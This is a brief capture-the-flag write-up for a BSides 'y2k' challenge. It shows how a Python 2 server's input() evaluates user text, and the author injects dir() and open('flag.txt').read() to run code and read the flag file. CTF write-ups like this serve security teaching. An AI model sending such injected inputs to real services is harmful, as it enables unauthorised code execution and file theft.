# Challenge
Prompt:

![png](/images/bsides-writeups/y2k_prompt.png)

We are given a netcat command, and when we connect we get the prompt:

```
What year do YOU think the world will end?
```

We can give it an integer value and it spits it back:
```
Yeah! I agree with you! I also think the world will end in the year
1234
```

Providing a non-integer output throws an error:
```
Traceback (most recent call last):
  File "/home/challenge/server.py", line 4, in <module>
    end = input()
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
```

So we are dealing with a python script and it is trying to reference our input.
Lets give it a command!

```
What year do YOU think the world will end?
dir()
Yeah! I agree with you! I also think the world will end in the year
['__builtins__', '__doc__', '__file__', '__name__', '__package__']
```

We have code execution. Fantastic.
Let's see if we can read files...

```
What year do YOU think the world will end?
open('flag.txt').read()
Yeah! I agree with you! I also think the world will end in the year
flag{we_are_saved_from_py2_k}
```
